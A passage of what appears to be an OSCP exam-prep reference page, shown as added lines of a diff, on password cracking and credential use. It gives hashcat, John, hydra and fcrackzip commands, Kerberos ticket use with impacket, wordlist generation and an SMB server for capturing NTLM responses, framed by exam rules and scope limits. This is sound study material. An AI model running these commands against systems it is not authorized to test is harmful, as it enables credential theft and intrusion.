+<p>WMI needs administrative rights plus DCOM/RPC/SMB reachability and normally runs as the authenticated user. PsExec-style execution needs service-control and writable-share rights and commonly yields SYSTEM. RDP hash authentication depends on target/client support and policy. Detailed method selection belongs to the lateral-movement procedure.</p>
+</details>
+<h2 id="net-ntlmv2-response">Net-NTLMv2 response</h2>
+<pre><code class="language-bash">hashcat -a 0 -m 5600 netntlmv2.hash wordlist.txt
+john --format=netntlmv2 --wordlist=wordlist.txt netntlmv2.hash
+</code></pre>
+<blockquote>
+<p>A Net-NTLMv2 response is not an NT hash and cannot be supplied to <code>-H</code> or <code>-hashes</code>. Relay forwards a live authentication exchange and requires received/coerced authentication, compatible protocols, signing/channel-binding conditions and useful rights.</p>
+</blockquote>
+<p>The OSCP+ exam prohibits spoofing, including NBNS. Do not use Responder poisoning on the exam. Keep capture/relay work to explicitly authorized labs and recheck the current guide.</p>
+<h2 id="dcc2--cached-domain-logon">DCC2 / cached domain logon</h2>
+<pre><code class="language-bash">hashcat -hh | grep -i 'Domain Cached'
+john --format=mscash2 --wordlist=wordlist.txt dcc2.hash
+</code></pre>
+<blockquote>
+<p>Preserve the username because it participates in the verifier. DCC2 is an offline recovery target, not ordinary PtH material.</p>
+</blockquote>
+<h2 id="kerberos-tickets-and-caches">Kerberos tickets and caches</h2>
+<p>Inspect before use:</p>
+<pre><code class="language-bash">klist
+KRB5CCNAME=TICKET.ccache klist
+impacket-ticketConverter TICKET.kirbi TICKET.ccache
+</code></pre>
+<p>Compatible client example:</p>
+<pre><code class="language-bash">export KRB5CCNAME=TICKET.ccache
+impacket-wmiexec -k -no-pass 'DOMAIN/USER@HOST.DOMAIN'
+</code></pre>
+<blockquote>
+<p>Verify client principal, realm, TGT versus service ticket, SPN, start/end time, clock, DNS/FQDN and routes. A readable cache does not prove authorization. Roasting, forging and detailed PtT/overpass belong to the AD procedures.</p>
+</blockquote>
+<h2 id="credential-guard-boundary">Credential Guard boundary</h2>
+<pre><code class="language-powershell">Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesConfigured,DeviceGuardSecurityServicesRunning
+</code></pre>
+<p>Credential Guard can isolate reusable domain secrets from ordinary LSASS memory. It does not erase local SAM, file, vault, DPAPI, ticket, service-configuration or directory-right paths. One failed dump method disproves only that method and context. Intrusive SSP interception changes system state and waits for a future logon; it is not the default Block 5 response.</p>
+<h2 id="failure-routing">Failure routing</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Failure</th><th>Interpretation / next action</th></tr></thead><tbody><tr><td>Timeout/no route</td><td>Fix source position, pivot or service reachability before judging the credential</td></tr><tr><td>Wrong TLS/protocol response</td><td>Reconfirm application and required transport</td></tr><tr><td>Local/domain/UPN mismatch</td><td>Retry only an evidence-backed identity form</td></tr><tr><td>Account disabled/locked/expired/restricted</td><td>Stop guessing; preserve possible credential validity and record state</td></tr><tr><td>Password/public-key/NTLM/Kerberos method rejected</td><td>Choose material/client compatible with server policy</td></tr><tr><td>Authentication succeeds, requested action fails</td><td>Credential is valid; enumerate authorization and another relevant service</td></tr><tr><td>Hash parser rejects input</td><td>Recheck complete line, prefix, converter, mode and version</td></tr><tr><td>Key unlocks but SSH rejects it</td><td>Recheck user, server, authorized-key state and algorithm policy</td></tr><tr><td>Ticket loads but service rejects it</td><td>Check expiry, SPN, realm, clock, DNS and service authorization</td></tr><tr><td>PtH login succeeds but execution fails</td><td>Check admin rights, UAC remote restrictions and method-specific ports/rights</td></tr></tbody></table>
+<h2 id="re-enumerate-after-success">Re-enumerate after success</h2>
+<pre><code class="language-text">accepted identity -> groups/roles -> reachable services -> shares/files
+-> authenticated application behavior -> accessible hosts/routes
+-> new credentials/tickets/sessions -> privilege and movement handoffs
+</code></pre>
+<p>Verify destination host, accepted identity and actual read/write/execute rights. New hosts/listeners return to discovery; recovered material returns here; operating-system execution enters session handling; domain identities enter AD mapping.</p>
+<h2 id="build-a-small-site-specific-wordlist-with-cewl">Build a small site-specific wordlist with CeWL</h2>
+<p>Use when observed organization, product or account vocabulary could improve an offline recovery attempt. Keep the crawl on the assigned site.</p>
+<pre><code class="language-bash"># Bounded crawl: depth 1, words of at least five characters
+cewl -d 1 -m 5 --lowercase -w site-words.txt http://TARGET:PORT/
+
+# Review before using it in the existing format-specific recovery command
+head -n 30 site-words.txt
+wc -l site-words.txt
+</code></pre>
+<p>Read: useful vocabulary is a candidate list, not a recovered password. An authenticated or JS-only page may expose little to the crawler. Use the already identified Hashcat/John format, then apply a small relevant rule/mask rather than immediately creating an enormous list.</p>
+<p>Sources: <a href="https://github.com/digininja/CeWL">upstream 1</a>.</p>
+<h2 id="generate-usernames-from-observed-naming-conventions">Generate usernames from observed naming conventions</h2>
+<p>Use when you have names and at least one real account/email that reveals a likely format. Put only relevant names in names.txt.</p>
+<pre><code class="language-bash"># Review supported format names in this installed version
+./username-anarchy --list-formats
+
+# Restrict output to plausible formats rather than every permutation
+./username-anarchy -i names.txt -f first,first.last,flast,f.last > users.txt
+sort -u users.txt -o users.txt
+</code></pre>
+<p>Read: these are candidates. Confirm names with authorized directory/user enumeration; an email local part is not automatically a domain account. Keep domain, local-machine and application namespaces distinct. Use Kerbrute's username probe only when the KDC path and domain are known.</p>
+<p>Sources: <a href="https://github.com/urbanadventurer/username-anarchy">upstream 1</a>.</p>
+<h2 id="targeted-candidates--crunch-cupp-and-rules">Targeted candidates — Crunch, CUPP and rules</h2>
+<p>Use a mask/profile only when evidence justifies it. This example expands a known six-character stem with three digits; it creates 1,000 candidates.</p>
+<pre><code class="language-bash">crunch 9 9 -t 'foobar%%%' -o stem-digits.txt
+
+# Interactive profile-based alternative, when relevant clues exist
+python3 cupp.py -i
+
+# Preview a rule expansion before choosing the recovery job
+hashcat --stdout site-words.txt -r /usr/share/hashcat/rules/best64.rule | head -n 40
+</code></pre>
+<p>Read: calculate candidate count and use the matching offline format. CUPP asks questions; invented personal details do not improve the list. A three-digit suffix or a rule is a hypothesis, not a reason to spray every generated value at an online login.</p>
+<p>Sources: <a href="https://www.kali.org/tools/crunch/">upstream 1</a> · <a href="https://github.com/Mebus/cupp">upstream 2</a> · <a href="https://hashcat.net/wiki/">upstream 3</a>.</p>
+<h2 id="password-protected-zip--direct-test-or-extracted-verifier">Password-protected ZIP — direct test or extracted verifier</h2>
+<p>Use when the artifact is an encrypted ZIP and its encryption is supported by the selected tool.</p>
+<pre><code class="language-bash"># Dictionary attack; -u checks candidates by attempting extraction
+fcrackzip -u -D -p WORDLIST archive.zip
+
+# Alternative: extract a verifier for John, preserving the original archive
+zip2john archive.zip > archive.hash
+john --wordlist=WORDLIST archive.hash
+john --show archive.hash
+</code></pre>
+<p>Read: confirm a candidate by opening/extracting the intended file. An unsupported encryption type or empty verifier is a format/tool issue, not proof that the password is unguessable. Reuse the recovered value only after identifying its account/service context.</p>
+<p>Sources: <a href="https://www.kali.org/tools/fcrackzip/">upstream 1</a> · <a href="https://www.openwall.com/john/">upstream 2</a>.</p>
+<h2 id="http-basic-authentication--validate-the-challenge-and-failure-signal">HTTP Basic authentication — validate the challenge and failure signal</h2>
+<p>Use when the endpoint returns a real HTTP Basic challenge. A custom HTML login form is a different mechanism.</p>
+<pre><code class="language-bash">curl -i http://TARGET:PORT/PROTECTED_PATH
+curl -i --basic -u USER http://TARGET:PORT/PROTECTED_PATH
+
+# Only when bounded online guessing is justified by scope and lockout controls
+hydra -l USER -P WORDLIST -s PORT -t 1 -f TARGET http-get /PROTECTED_PATH
+</code></pre>
+<p>Read: distinguish an accepted HTTP identity from permission to the protected function. Confirm a reported success with curl/browser. Redirects, uniform 200 pages or a mismatched realm/path make weak success detectors; fix the request before increasing guesses.</p>
+<p>Sources: <a href="https://github.com/vanhauser-thc/thc-hydra">upstream 1</a> · <a href="https://curl.se/docs/manpage.html">upstream 2</a>.</p>
+<h2 id="change-an-accounts-own-expiredknown-smb-password">Change an account’s own expired/known SMB password</h2>
+<p>Use when you know the old password and the account is allowed or required to change it. This is not an administrative reset of another account.</p>
+<pre><code class="language-bash"># Prompts for the old and new password on the specified server/DC
+smbpasswd -r DC_HOST -U 'DOMAIN/USER'
+</code></pre>
+<p>Read: a successful change means subsequent password logins need the new value; existing ticket/session contexts do not automatically become new logons. Failure → check account scope, password policy, connectivity and change-password rights. Test the new password with the relevant native service client before moving on.</p>
+<p>Sources: <a href="https://www.samba.org/samba/docs/current/man-html/smbpasswd.8.html">upstream 1</a>.</p>
+<h2 id="generate-a-bounded-numeric-list-for-an-observed-identifier-pattern">Generate a bounded numeric list for an observed identifier pattern</h2>
+<p>Use when actual examples indicate a small numeric ID/range. Keep generated input separate from the decision to send online requests.</p>
+<pre><code class="language-bash"># Unpadded IDs
+seq 0 999 > numbers.txt
+
+# Fixed-width values, only when the observed application uses that format
+seq -w 0 999 > numbers-padded.txt
+</code></pre>
+<p>Read: a matching format is a candidate input list, not permission to enumerate every object. Use the real session and compare owned/other/disallowed-object controls in the existing authorization workflow. Expand the range only when returned evidence justifies it.</p>
+<p>Sources: <a href="https://www.gnu.org/software/coreutils/manual/html_node/seq-invocation.html">upstream 1</a>.</p>
+<h2 id="an-application-authenticates-to-your-explicit-smb-endpoint">An application authenticates to your explicit SMB endpoint</h2>
+<p>Use only when an observed application/file-request primitive can contact an explicitly supplied SMB path and the network/account policy permits NTLM. This workflow does not poison names or spoof network identities.</p>
+<pre><code class="language-bash"># Attacker: serve the intended directory and keep the authentication log
+mkdir -p share
+sudo impacket-smbserver SHARE ./share -smb2support 2>&#x26;1 | tee smb-server.log
+
+# A captured Net-NTLMv2 line is an offline-recovery artifact, not an NT hash
+hashcat -m 5600 netntlmv2.txt WORDLIST
+hashcat -m 5600 netntlmv2.txt --show
+</code></pre>
+<p>Supply the actual application with the intended <code>\\LHOST\SHARE\FILE</code> path only through the already verified input mechanism. Read: retain the entire challenge-response line and the reported account/domain. No callback can be routing, SMB egress or NTLM policy; a callback without recoverable credentials is not a password. Validate a recovered plaintext password in the matching identity. Do not substitute this response for the NT hash expected by pass-the-hash tools.</p>
+<p>Sources: <a href="https://github.com/fortra/impacket/blob/master/examples/smbserver.py">upstream 1</a> · <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">upstream 2</a>.</p>
+<h2 id="sources">Sources</h2>
+<ul>
+<li><a href="https://lizajose.github.io/getSH/password-cracking">getSH Password Cracking route</a>, source snapshot <a href="https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98"><code>e1f62dd</code></a></li>
+<li>Supplied PEN-200 Chapter 16, pp442-493</li>
+<li><a href="https://github.com/LeonardoE95/OSCP/blob/main/modules/windows/windows-privesc-cheatsheet.txt">Hexdump Windows hash and credential sections</a></li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge">Current OSCP+ Body of Knowledge</a></li>
+<li><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat example hashes</a></li>
+<li><a href="https://www.openwall.com/john/doc/">John the Ripper documentation</a></li>
+<li><a href="https://github.com/vanhauser-thc/thc-hydra">Hydra official repository</a></li>
+<li><a href="https://www.netexec.wiki/getting-started/using-credentials">NetExec credential use</a></li>
+<li><a href="https://github.com/fortra/impacket">Impacket official repository</a></li>
+<li><a href="https://man.openbsd.org/ssh">OpenSSH manual</a></li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide">Current OSCP+ exam guide</a></li>
+</ul></article><hr><p><a href="#document">Top of document</a> · <a href="/oscp/">Reference home</a></p></main></body></html>
